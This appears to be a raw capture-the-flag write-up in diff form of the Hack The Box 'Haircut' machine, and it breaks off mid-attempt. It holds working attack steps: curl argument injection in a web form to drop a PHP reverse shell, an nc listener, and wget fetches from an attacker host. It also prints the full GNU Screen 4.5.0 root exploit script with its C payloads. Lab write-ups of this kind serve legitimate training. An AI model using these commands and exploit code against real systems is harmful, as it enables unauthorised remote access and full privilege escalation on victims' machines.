@@ -1,0 +1,646 @@
+
+RECON
+root@kali:~/htb/haircut# nmap -sC -sV -p- -vv -oA full 10.10.10.24
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 e9:75:c1:e4:b3:63:3c:93:f2:c6:18:08:36:48:ce:36 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDo4pezhJs9c3u8vPWIL9eW4qxQOrHCslAdMftg/p1HDLCKc+9otg+MmQMlxF7jzEu8vJ0GPfg5ONRxlsfx1mwmAXmKLh9GK4WD2pFbg4iFiAO/BAUjs3dNdR1S9wR6F+yRc2jgIyKFJO3JohZZFnM6BrTkZO7+IkSF6b3z2qzaWorHZW04XHdbxKjVCHpU5ewWQ5B32ScKRJE8bsi04Z2lE5vk1NWK15gOqmuyEBK8fcQpD1zCI6bPc5qZlwrRv4r4krCb1h8zYtAwVnoZdtYVopfACgWHxqe+/8YqS8qo4nPfEXq8LkUc2VWmFztWMCBuwVFvW8Pf34VDD4dEiIwz
+|   256 87:00:ab:a9:8f:6f:4b:ba:fb:c6:7a:55:a8:60:b2:68 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLrPH0YEefX9y/Kyg9prbVSPe3U7fH06/909UK8mAIm3eb6PWCCwXYC7xZcow1ILYvxF1GTaXYTHeDF6VqX0dzc=
+|   256 b6:1b:5c:a9:26:5c:dc:61:b7:75:90:6c:88:51:6e:54 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA+vUE7P+f2aiWmwJRuLE2qsDHrzJUzJLleMvKmIHoKM
+80/tcp open  http    syn-ack ttl 63 nginx 1.10.0 (Ubuntu)
+| http-methods: 
+|_  Supported Methods: GET HEAD
+|_http-server-header: nginx/1.10.0 (Ubuntu)
+|_http-title:  HTB Hairdresser 
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+VULN SCAN
+root@kali:~/htb/haircut# nmap -Pn --script vuln 10.10.10.24
+Starting Nmap 7.70 ( https://nmap.org ) at 2020-11-11 16:58 EST
+Nmap scan report for 10.10.10.24
+Host is up (0.024s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+|_http-csrf: Couldn't find any CSRF vulnerabilities.
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+| http-enum: 
+|_  /test.html: Test page
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+| http-vuln-cve2011-3192: 
+|   VULNERABLE:
+|   Apache byterange filter DoS
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2011-3192  OSVDB:74721
+|       The Apache web server is vulnerable to a denial of service attack when numerous
+|       overlapping byte ranges are requested.
+|     Disclosure date: 2011-08-19
+|     References:
+|       http://seclists.org/fulldisclosure/2011/Aug/175
+|       http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
+|       http://osvdb.org/74721
+|       http://nessus.org/plugins/index.php?view=single&id=55976
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
+
+
+ENUM WEB SERVICE
+root@kali:~/htb/haircut# whatweb 10.10.10.24
+http://10.10.10.24 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.10.0 (Ubuntu)], IP[10.10.10.24], Title[HTB Hairdresser], nginx[1.10.0]
+
+root@kali:~/htb/haircut# nikto -h http://10.10.10.24
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.10.24
++ Target Hostname:    10.10.10.24
++ Target Port:        80
++ Start Time:         2020-11-11 16:32:37 (GMT-5)
+---------------------------------------------------------------------------
++ Server: nginx/1.10.0 (Ubuntu)
++ Server leaks inodes via ETags, header found with file /, fields: 0x59198410 0x90 
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ OSVDB-3092: /test.html: This might be interesting...
++ 7499 requests: 0 error(s) and 5 item(s) reported on remote host
++ End Time:           2020-11-11 16:41:39 (GMT-5) (542 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+root@kali:~/htb/haircut# gobuster -u http://10.10.10.24 -w /usr/share/seclists/Discovery/Web-Content/common.txt -s '200,204,301,302,307,403' -e -fw
+
+Gobuster v1.4.1              OJ Reeves (@TheColonial)
+=====================================================
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://10.10.10.24/
+[+] Threads      : 10
+[+] Wordlist     : /usr/share/seclists/Discovery/Web-Content/common.txt
+[+] Status codes : 307,403,200,204,301,302
+[+] Expanded     : true
+=====================================================
+http://10.10.10.24/index.html (Status: 200)
+http://10.10.10.24/uploads (Status: 301)
+=====================================================
+
+http://10.10.10.24/exposed.php
+curl -r http://10.10.14.8/rshell.php
+
+FIND ADDITIONAL DIRECTORIES
+
+root@kali:~/htb/haircut# python3 /root/dirsearch/dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e "js,html,txt,php,jpg" -f -t 50 -u http://10.10.10.24
+
+  _|. _ _  _  _  _ _|_    v0.4.0
+ (_||| _) (/_(_|| (_| )
+
+Extensions: js, html, txt, php, jpg | HTTP method: GET | Threads: 50 | Wordlist size: 1543640
+
+Error Log: /root/dirsearch/logs/errors-20-11-11_20-59-34.log
+
+Target: http://10.10.10.24/
+
+Output File: /root/dirsearch/reports/10.10.10.24/_20-11-11_20-59-34.txt
+
+[20:59:34] Starting: 
+[20:59:35] 200 -  144B  - //index.html
+[20:59:36] 403 -  580B  - //uploads/
+[20:59:36] 301 -  194B  - //uploads  ->  http://10.10.10.24/uploads/
+[20:59:45] 200 -  223B  - //test.html
+[21:00:59] 200 -  132KB - //sea.jpg
+[21:02:23] 200 -  141B  - //hair.html
+[21:02:54] 200 -  114KB - //bounce.jpg
+[21:05:33] 200 -  446B  - //exposed.php
+[21:14:36] 200 -  164KB - //carrie.jpg
+
+Task Completed
+
+
+CREATE TEST PHP FILE
+vim test.php
+<?php phpinfo(); ?>
+
+TEST FILE UPLOADED
+view-source:http://10.10.10.24/exposed.php
+<html>
+	<head>
+		<title>Hairdresser checker</title>
+	</head>
+	<body>
+	<form action='exposed.php' method='POST'>
+		<span>
+		<p>
+		Enter the Hairdresser's location you would like to check. Example: http://localhost/test.html
+		</p>
+		</span>
+		<input type='text' name='formurl' id='formurl' width='50' value='http://localhost/test.html'/>
+		<input type='submit' name='submit' value='Go' id='submit' />
+	</form>
+	<span>
+		<p>Requesting Site...</p>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
+100    20  100    20    0     0    469      0 --:--:-- --:--:-- --:--:--   476
+<?php phpinfo(); ?>
+	</span>
+	</body>
+</html>
+
+ADD -H PARAMTER TO TEST FILE REQUEST
+curl -r http://10.10.14.8/test.php -h
+Requesting Site...
+Warning: Invalid character is found in given range. A specified range MUST Warning: have only digits in 'start'-'stop'. The server's response to this Warning: request is uncertain. Usage: curl [options...] Options: (H) means HTTP/HTTPS only, 
+
+WRITE A FILE WITH CURL
+curl -r http://10.10.14.8/test.php -o test.php
+ % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 0 0 0 0 0 0 0 0 --:--:-- --:--:-- --:--:-- 0Warning: Failed to create the file test.php: Permission denied 100 20 100 20 0 0 518 0 --:--:-- --:--:-- --:--:-- 526 curl: (23) Failed writing body (0 != 20) 
+
+WRITE TO UPLOAD DIRECTORY
+curl -r http://10.10.14.8/test.php -o uploads/test.php
+                                 Dload  Upload   Total   Spent    Left  Speed
+
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
+100    20  100    20    0     0    520      0 --:--:-- --:--:-- --:--:--   526
+
+BROWSE TO UPLOADED TEST.PHP FILE
+http://10.10.10.24/uploads/test.php
+
+PHP Version 7.0.15-0ubuntu0.16.04.4
+System 	Linux haircut 4.4.0-78-generic #99-Ubuntu SMP Thu Apr 27 15:29:09 UTC 2017 x86_64 
+
+UPLOAD PHP REVERSE SHELL
+http://10.10.14.8/rshell.php -o uploads/rshell.php
+% Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 0 0 0 0 0 0 0 0 --:--:-- --:--:-- --:--:-- 0 100 5492 100 5492 0 0 131k 0 --:--:-- --:--:-- --:--:-- 134k 
+
+START LISTENER
+root@kali:~/htb/haircut# nc -lvp 1234
+listening on [any] 1234 ...
+
+
+TRIGGER REVERSE SHELL
+http://10.10.10.24/uploads/rshell.php
+
+GET LOW PRIV REVERSE SHELL
+root@kali:~/htb/haircut# nc -lvp 1234
+listening on [any] 1234 ...
+
+10.10.10.24: inverse host lookup failed: Unknown host
+connect to [10.10.14.8] from (UNKNOWN) [10.10.10.24] 52912
+Linux haircut 4.4.0-78-generic #99-Ubuntu SMP Thu Apr 27 15:29:09 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
+ 03:37:42 up  5:11,  0 users,  load average: 0.07, 0.04, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ $ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ python -c 'import pty; pty.spawn("/bin/bash")'
+/bin/sh: 3: python: not found
+$ python3 -c "import pty;pty.spawn('/bin/bash')"
+www-data@haircut:/$ 
+
+www-data@haircut:/$ pwd
+pwd
+/
+www-data@haircut:/$ ls -l /home
+ls -l /home
+total 4
+drwxr-xr-x 15 maria maria 4096 May 19  2017 maria
+www-data@haircut:/$ ls -l /home/maria
+ls -l /home/maria
+total 32
+drwxr-xr-x 2 maria maria 4096 May 19  2017 Desktop
+drwxr-xr-x 2 maria maria 4096 May 16  2017 Documents
+drwxr-xr-x 2 maria maria 4096 May 16  2017 Downloads
+drwxr-xr-x 2 maria maria 4096 May 16  2017 Music
+drwxr-xr-x 2 maria maria 4096 May 16  2017 Pictures
+drwxr-xr-x 2 maria maria 4096 May 16  2017 Public
+drwxr-xr-x 2 maria maria 4096 May 16  2017 Templates
+drwxr-xr-x 2 maria maria 4096 May 16  2017 Videos
+
+GET USER FLAG
+www-data@haircut:/$ cat /home/maria/Desktop/user.txt
+cat /home/maria/Desktop/user.txt
+#######################################
+
+PRIVESC
+
+TRANSFER LINENUM
+www-data@haircut:/$ cd /tmp
+cd /tmp
+www-data@haircut:/tmp$ ls
+ls
+systemd-private-2f19345395374c15ac5c24239c06cfb9-systemd-timesyncd.service-ENBvR9
+vmware-root
+www-data@haircut:/tmp$ wget 10.10.14.8/LinEnum.sh
+wget 10.10.14.8/LinEnum.sh
+--2020-11-12 03:43:19--  http://10.10.14.8/LinEnum.sh
+Connecting to 10.10.14.8:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 46631 (46K) [text/x-sh]
+Saving to: 'LinEnum.sh'
+
+LinEnum.sh          100%[===================>]  45.54K  --.-KB/s    in 0.1s    
+
+2020-11-12 03:43:19 (455 KB/s) - 'LinEnum.sh' saved [46631/46631]
+
+www-data@haircut:/tmp$ chmod 744 LinEnum.sh
+chmod 744 LinEnum.sh
+www-data@haircut:/tmp$ ls -l
+ls -l
+total 56
+-rwxr--r-- 1 www-data www-data 46631 Nov 12 03:38 LinEnum.sh
+drwx------ 3 root     root      4096 Nov 11 22:26 systemd-private-2f19345395374c15ac5c24239c06cfb9-systemd-timesyncd.service-ENBvR9
+drwx------ 2 root     root      4096 Nov 11 22:26 vmware-root
+
+RUN LINENUM
+www-data@haircut:/tmp$ ./LinEnum.sh
+./LinEnum.sh
+
+#########################################################
+# Local Linux Enumeration & Privilege Escalation Script #
+#########################################################
+# www.rebootuser.com
+# version 0.982
+
+[-] Debug Info
+[+] Thorough tests = Disabled
+
+
+Scan started at:
+Thu Nov 12 03:43:50 CET 2020
+
+
+### SYSTEM ##############################################
+[-] Kernel information:
+Linux haircut 4.4.0-78-generic #99-Ubuntu SMP Thu Apr 27 15:29:09 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
+
+
+[-] Kernel information (continued):
+Linux version 4.4.0-78-generic (buildd@lgw01-11) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #99-Ubuntu SMP Thu Apr 27 15:29:09 UTC 2017
+
+
+[-] Specific release information:
+DISTRIB_ID=Ubuntu
+DISTRIB_RELEASE=16.04
+DISTRIB_CODENAME=xenial
+DISTRIB_DESCRIPTION="Ubuntu 16.04.2 LTS"
+NAME="Ubuntu"
+VERSION="16.04.2 LTS (Xenial Xerus)"
+ID=ubuntu
+ID_LIKE=debian
+PRETTY_NAME="Ubuntu 16.04.2 LTS"
+VERSION_ID="16.04"
+HOME_URL="http://www.ubuntu.com/"
+SUPPORT_URL="http://help.ubuntu.com/"
+BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
+VERSION_CODENAME=xenial
+UBUNTU_CODENAME=xenial
+
+
+[-] Hostname:
+haircut
+
+
+[-] Available shells:
+# /etc/shells: valid login shells
+/bin/sh
+/bin/dash
+/bin/bash
+/bin/rbash
+/usr/bin/tmux
+/usr/bin/screen
+
+
+[-] /etc/init.d/ binary permissions:
+total 356
+drwxr-xr-x   2 root root 4096 May 22  2017 .
+drwxr-xr-x 109 root root 4096 May 22  2017 ..
+-rw-r--r--   1 root root 1286 May 22  2017 .depend.boot
+-rw-r--r--   1 root root 1291 May 22  2017 .depend.start
+-rw-r--r--   1 root root 1286 May 22  2017 .depend.stop
+-rw-r--r--   1 root root 2427 Jan 19  2016 README
+-rwxr-xr-x   1 root root 2243 Feb  9  2016 acpid
+-rwxr-xr-x   1 root root 5336 Apr 15  2016 alsa-utils
+-rwxr-xr-x   1 root root 2014 Dec 28  2014 anacron
+-rwxr-xr-x   1 root root 6223 Mar  3  2017 apparmor
+-rwxr-xr-x   1 root root 2799 Mar 31  2016 apport
+-rwxr-xr-x   1 root root 1071 Dec  6  2015 atd
+-rwxr-xr-x   1 root root 2968 Mar  1  2016 bluetooth
+-rwxr-xr-x   1 root root 1275 Jan 19  2016 bootmisc.sh
+-rwxr-xr-x   1 root root 3807 Jan 19  2016 checkfs.sh
+-rwxr-xr-x   1 root root 1098 Jan 19  2016 checkroot-bootclean.sh
+-rwxr-xr-x   1 root root 9353 Jan 19  2016 checkroot.sh
+-rwxr-xr-x   1 root root 1343 Apr  4  2016 console-setup
+-rwxr-xr-x   1 root root 3049 Apr  5  2016 cron
+-rwxr-xr-x   1 root root  937 Mar 28  2015 cryptdisks
+-rwxr-xr-x   1 root root  896 Mar 28  2015 cryptdisks-early
+-rwxr-xr-x   1 root root 2813 Dec  2  2015 dbus
+-rwxr-xr-x   1 root root 1105 Mar 15  2016 grub-common
+-rwxr-xr-x   1 root root 1336 Jan 19  2016 halt
+-rwxr-xr-x   1 root root 1423 Jan 19  2016 hostname.sh
+-rwxr-xr-x   1 root root 3809 Mar 12  2016 hwclock.sh
+-rwxr-xr-x   1 root root 2372 Apr 11  2016 irqbalance
+-rwxr-xr-x   1 root root 1503 Mar 29  2016 iscsid
+-rwxr-xr-x   1 root root 1804 Apr  4  2016 keyboard-setup
+-rwxr-xr-x   1 root root 1300 Jan 19  2016 killprocs
+-rwxr-xr-x   1 root root 2087 Dec 21  2015 kmod
+-rwxr-xr-x   1 root root 3431 Mar 31  2017 lightdm
+-rwxr-xr-x   1 root root  695 Oct 30  2015 lvm2
+-rwxr-xr-x   1 root root  571 Oct 30  2015 lvm2-lvmetad
+-rwxr-xr-x   1 root root  586 Oct 30  2015 lvm2-lvmpolld
+-rwxr-xr-x   1 root root 2300 Feb  3  2017 lxcfs
+-rwxr-xr-x   1 root root 2541 Feb  3  2017 lxd
+-rwxr-xr-x   1 root root 2611 Apr 11  2016 mdadm
+-rwxr-xr-x   1 root root 1199 Jul 16  2014 mdadm-waitidle
+-rwxr-xr-x   1 root root  703 Jan 19  2016 mountall-bootclean.sh
+-rwxr-xr-x   1 root root 2301 Jan 19  2016 mountall.sh
+-rwxr-xr-x   1 root root 1461 Jan 19  2016 mountdevsubfs.sh
+-rwxr-xr-x   1 root root 1564 Jan 19  2016 mountkernfs.sh
+-rwxr-xr-x   1 root root  711 Jan 19  2016 mountnfs-bootclean.sh
+-rwxr-xr-x   1 root root 2456 Jan 19  2016 mountnfs.sh
+-rwxr-xr-x   1 root root 5607 Feb  3  2017 mysql
+-rwxr-xr-x   1 root root 1757 Jan 11  2017 network-manager
+-rwxr-xr-x   1 root root 4771 Jul 19  2015 networking
+-rwxr-xr-x   1 root root 4579 Apr 26  2016 nginx
+-rwxr-xr-x   1 root root 1581 Oct 16  2015 ondemand
+-rwxr-xr-x   1 root root 2503 Mar 29  2016 open-iscsi
+-rwxr-xr-x   1 root root 1578 Sep 18  2016 open-vm-tools
+-rwxr-xr-x   1 root root 4987 Mar  2  2017 php7.0-fpm
+-rwxr-xr-x   1 root root 1366 Nov 15  2015 plymouth
+-rwxr-xr-x   1 root root  752 Nov 15  2015 plymouth-log
+-rwxr-xr-x   1 root root 1192 Sep  6  2015 procps
+-rwxr-xr-x   1 root root 6366 Jan 19  2016 rc
+-rwxr-xr-x   1 root root  820 Jan 19  2016 rc.local
+-rwxr-xr-x   1 root root  117 Jan 19  2016 rcS
+-rwxr-xr-x   1 root root  661 Jan 19  2016 reboot
+-rwxr-xr-x   1 root root 4149 Nov 23  2015 resolvconf
+-rwxr-xr-x   1 root root 4355 Jul 10  2014 rsync
+-rwxr-xr-x   1 root root 2796 Feb  3  2016 rsyslog
+-rwxr-xr-x   1 root root 1226 Jun  9  2015 screen-cleanup
+-rwxr-xr-x   1 root root 3927 Jan 19  2016 sendsigs
+-rwxr-xr-x   1 root root  597 Jan 19  2016 single
+-rw-r--r--   1 root root 1087 Jan 19  2016 skeleton
+-rwxr-xr-x   1 root root 4077 Mar 16  2017 ssh
+-rwxr-xr-x   1 root root 6087 Apr 12  2016 udev
+-rwxr-xr-x   1 root root 2049 Aug  7  2014 ufw
+-rwxr-xr-x   1 root root 2737 Jan 19  2016 umountfs
+-rwxr-xr-x   1 root root 2202 Jan 19  2016 umountnfs.sh
+-rwxr-xr-x   1 root root 1879 Jan 19  2016 umountroot
+-rwxr-xr-x   1 root root 1391 Apr 20  2017 unattended-upgrades
+-rwxr-xr-x   1 root root 3111 Jan 19  2016 urandom
+-rwxr-xr-x   1 root root 1306 Dec 16  2016 uuidd
+-rwxr-xr-x   1 root root 2757 Nov 10  2015 x11-common
+
+[-] SUID files:
+-rwsr-xr-x 1 root root 142032 Jan 28  2017 /bin/ntfs-3g
+-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
+-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
+-rwsr-xr-x 1 root root 40128 May  4  2017 /bin/su
+-rwsr-xr-x 1 root root 40152 Dec 16  2016 /bin/mount
+-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
+-rwsr-xr-x 1 root root 27608 Dec 16  2016 /bin/umount
+-rwsr-xr-x 1 root root 136808 Jan 20  2017 /usr/bin/sudo
+-rwsr-xr-x 1 root root 23376 Jan 18  2016 /usr/bin/pkexec
+-rwsr-xr-x 1 root root 32944 May  4  2017 /usr/bin/newuidmap
+-rwsr-xr-x 1 root root 39904 May  4  2017 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 32944 May  4  2017 /usr/bin/newgidmap
+-rwsr-xr-x 1 root root 75304 May  4  2017 /usr/bin/gpasswd
+-rwsr-sr-x 1 daemon daemon 51464 Jan 14  2016 /usr/bin/at
+-rwsr-xr-x 1 root root 54256 May  4  2017 /usr/bin/passwd
+-rwsr-xr-x 1 root root 1588648 May 19  2017 /usr/bin/screen-4.5.0
+-rwsr-xr-x 1 root root 40432 May  4  2017 /usr/bin/chsh
+-rwsr-xr-x 1 root root 49584 May  4  2017 /usr/bin/chfn
+-rwsr-xr-x 1 root root 38984 Mar  7  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+-rwsr-xr-- 1 root messagebus 42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 208680 Apr 29  2017 /usr/lib/snapd/snap-confine
+-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root root 428240 Mar 16  2017 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 14864 Jan 18  2016 /usr/lib/policykit-1/polkit-agent-helper-1
+
+
+[-] SGID files:
+-rwxr-sr-x 1 root shadow 35600 Mar 16  2016 /sbin/unix_chkpwd
+-rwxr-sr-x 1 root shadow 35632 Mar 16  2016 /sbin/pam_extrausers_chkpwd
+-rwxr-sr-x 1 root mlocate 39520 Nov 18  2014 /usr/bin/mlocate
+-rwxr-sr-x 1 root shadow 62336 May  4  2017 /usr/bin/chage
+-rwxr-sr-x 1 root utmp 434216 Feb  7  2016 /usr/bin/screen.old
+-rwxr-sr-x 1 root crontab 36080 Apr  5  2016 /usr/bin/crontab
+-rwxr-sr-x 1 root tty 14752 Mar  1  2016 /usr/bin/bsd-write
+-rwxr-sr-x 1 root shadow 22768 May  4  2017 /usr/bin/expiry
+-rwxr-sr-x 1 root ssh 358624 Mar 16  2017 /usr/bin/ssh-agent
+-rwsr-sr-x 1 daemon daemon 51464 Jan 14  2016 /usr/bin/at
+-rwxr-sr-x 1 root tty 27368 Dec 16  2016 /usr/bin/wall
+-rwxr-sr-x 1 root utmp 10232 Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter
+
+
+CHECK SETUID BIT
+
+SEARCH FOR SCREEN EXPLOIT
+root@kali:~/htb/haircut# searchsploit screen 4.5.0
+---------------------------------------------------- ----------------------------------------
+ Exploit Title                                      |  Path
+                                                    | (/usr/share/exploitdb/)
+---------------------------------------------------- ----------------------------------------
+GNU Screen 4.5.0 - Local Privilege Escalation       | exploits/linux/local/41154.sh
+GNU Screen 4.5.0 - Local Privilege Escalation (PoC) | exploits/linux/local/41152.txt
+---------------------------------------------------- ----------------------------------------
+Shellcodes: No Result
+
+root@kali:~/htb/haircut# searchsploit -m 41154
+  Exploit: GNU Screen 4.5.0 - Local Privilege Escalation
+      URL: https://www.exploit-db.com/exploits/41154/
+     Path: /usr/share/exploitdb/exploits/linux/local/41154.sh
+File Type: Bourne-Again shell script, ASCII text executable, with CRLF line terminators
+
+Copied to: /root/htb/haircut/41154.sh
+
+**IMPORTANT** MUST COMPILE ON x86_64 MACHINE NOT i686 OTHERWISE WILL GET ERROR: ERROR: ld.so: object '/tmp/libhax.so' from /etc/ld.so.preload cannot be preloaded (wrong ELF class: ELFCLASS32): ignored.
+
+FOLLOW INSTRUCTIONS IN SCRIPT
+root@kali:~/htb/haircut# cat 41154.sh 
+#!/bin/bash
+# screenroot.sh
+# setuid screen v4.5.0 local root exploit
+# abuses ld.so.preload overwriting to get root.
+# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
+# HACK THE PLANET
+# ~ infodox (25/1/2017) 
+echo "~ gnu/screenroot ~"
+echo "[+] First, we create our shell and library..."
+cat << EOF > /tmp/libhax.c
+#include <stdio.h>
+#include <sys/types.h>
+#include <unistd.h>
+__attribute__ ((__constructor__))
+void dropshell(void){
+    chown("/tmp/rootshell", 0, 0);
+    chmod("/tmp/rootshell", 04755);
+    unlink("/etc/ld.so.preload");
+    printf("[+] done!\n");
+}
+EOF
+gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
+rm -f /tmp/libhax.c
+cat << EOF > /tmp/rootshell.c
+#include <stdio.h>
+int main(void){
+    setuid(0);
+    setgid(0);
+    seteuid(0);
+    setegid(0);
+    execvp("/bin/sh", NULL, NULL);
+}
+EOF
+gcc -o /tmp/rootshell /tmp/rootshell.c
+rm -f /tmp/rootshell.c
+echo "[+] Now we create our /etc/ld.so.preload file..."
+cd /etc
+umask 000 # because
+screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
+echo "[+] Triggering..."
+screen -ls # screen itself is setuid, so... 
+/tmp/rootshell
+
+
+CREATE LIBHAX C FILE AND ROOTHSHELL PER EXPLOIT INSTRUCTIONS
+root@kali:~/htb/haircut# vim libhax.c
+root@kali:~/htb/haircut# vim rootshell.c
+root@kali:~/htb/haircut# gcc -fPIC -shared -ldl -o libhax.so libhax.c 
+libhax.c: In function ‘dropshell’:
+libhax.c:7:5: warning: implicit declaration of function ‘chmod’; did you mean ‘chroot’? [-Wimplicit-function-declaration]
+     chmod("/tmp/rootshell", 04755);
+     ^~~~~
+     chroot
+root@kali:~/htb/haircut# gcc -o rootshell rootshell.c 
+rootshell.c: In function ‘main’:
+rootshell.c:3:5: warning: implicit declaration of function ‘setuid’; did you mean ‘setbuf’? [-Wimplicit-function-declaration]
+     setuid(0);
+     ^~~~~~
+     setbuf
+rootshell.c:4:5: warning: implicit declaration of function ‘setgid’; did you mean ‘setbuf’? [-Wimplicit-function-declaration]
+     setgid(0);
+     ^~~~~~
+     setbuf
+rootshell.c:5:5: warning: implicit declaration of function ‘seteuid’; did you mean ‘setbuf’? [-Wimplicit-function-declaration]
+     seteuid(0);
+     ^~~~~~~
+     setbuf
+rootshell.c:6:5: warning: implicit declaration of function ‘setegid’ [-Wimplicit-function-declaration]
+     setegid(0);
+     ^~~~~~~
+rootshell.c:7:5: warning: implicit declaration of function ‘execvp’ [-Wimplicit-function-declaration]
+     execvp("/bin/sh", NULL, NULL);
+     ^~~~~~
+root@kali:~/htb/haircut# ls -l libhax.so rootshell
+-rwxr-xr-x 1 root root 15068 Samh  12 16:58 libhax.so
+-rwxr-xr-x 1 root root 15600 Samh  12 16:58 rootshell
+
+
+UPLOAD FILES TO HAIRCUT
+www-data@haircut:/tmp$ wget -q http://10.10.14.8/libhax.so
+wget -q http://10.10.14.8/libhax.so
+www-data@haircut:/tmp$ wget -q http://10.10.14.8/rootshell.c
+wget -q http://10.10.14.8/rootshell.c
+
+RUN STEP TO PREPARE SCREEN EXPLOIT
+www-data@haircut:/tmp$ cd /etc/
+cd /etc/
+www-data@haircut:/etc$ umask 000
+umask 000
+www-data@haircut:/etc$ screen-4.5.0 -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"
+<en-4.5.0 -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"              
+www-data@haircut:/etc$ cat ld.so.preload
+cat ld.so.preload
+' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+[+] done!
+
+/tmp/libhax.sowww-data@haircut:/etc$ 
+
+www-data@haircut:/etc$ screen-4.5.0 -ls
+screen-4.5.0 -ls
+' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+[+] done!
+No Sockets found in /tmp/screens/S-www-data.
+
+www-data@haircut:/etc$ ls ld.so.preload
+ls ld.so.preload
+ls: cannot access 'ld.so.preload': No such file or directory
+www-data@haircut:/etc$ ls -l /tmp/rootshell 
+ls -l /tmp/rootshell 
+ls: cannot access '/tmp/rootshell': No such file or directory
+www-data@haircut:/etc$ ls -l /tmp/          
+ls -l /tmp/
+total 24
+-rw-rw-rw- 1 www-data www-data 8056 Nov 12 23:45 libhax.so
+-rw-rw-rw- 1 www-data www-data  134 Nov 12 23:45 rootshell.c
+drwxr-xr-x 3 root     www-data 4096 Nov 12 23:54 screens
+drwx------ 3 root     root     4096 Nov 12 23:12 systemd-private-91cba5d5ac044ba29afa4c2fbca38e9b-systemd-timesyncd.service-oXqMpa
+drwx------ 2 root     root     4096 Nov 12 23:12 vmware-root
+www-data@haircut:/etc$ cd /tmp
+cd /tmp
+www-data@haircut:/tmp$ ./rootshell
+./rootshell
+bash: ./rootshell: No such file or directory
+www-data@haircut:/tmp$ ls 
+ls
+libhax.so
+rootshell.c
+screens
+systemd-private-91cba5d5ac044ba29afa4c2fbca38e9b-systemd-timesyncd.service-oXqMpa
+vmware-root
+www-data@haircut:/tmp$ rm rootshell.c
+rm rootshell.c
+www-data@haircut:/tmp$ wget -q http://10.10.14.8/rootshell 
+wget -q http://10.10.14.8/rootshell
+www-data@haircut:/tmp$ ls -l 
+ls -l
+total 32
+-rw-rw-rw- 1 www-data www-data 8056 Nov 12 23:45 libhax.so
+-rw-rw-rw- 1 www-data www-data 8488 Nov 12 23:45 rootshell
+drwxr-xr-x 3 root     www-data 4096 Nov 12 23:54 screens
+drwx------ 3 root     root     4096 Nov 12 23:12 systemd-private-91cba5d5ac044ba29afa4c2fbca38e9b-systemd-timesyncd.service-oXqMpa
+drwx------ 2 root     root     4096 Nov 12 23:12 vmware-root
+www-data@haircut:/tmp$ cd /etc
+cd /etc
+www-data@haircut:/etc$ umask 000
+umask 000
+www-data@haircut:/etc$ screen-4.5.0 -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"
+<en-4.5.0 -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"              
+www-data@haircut:/etc$ cat ld.so.preload
+cat ld.so.preload
+' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+[+] done!
+
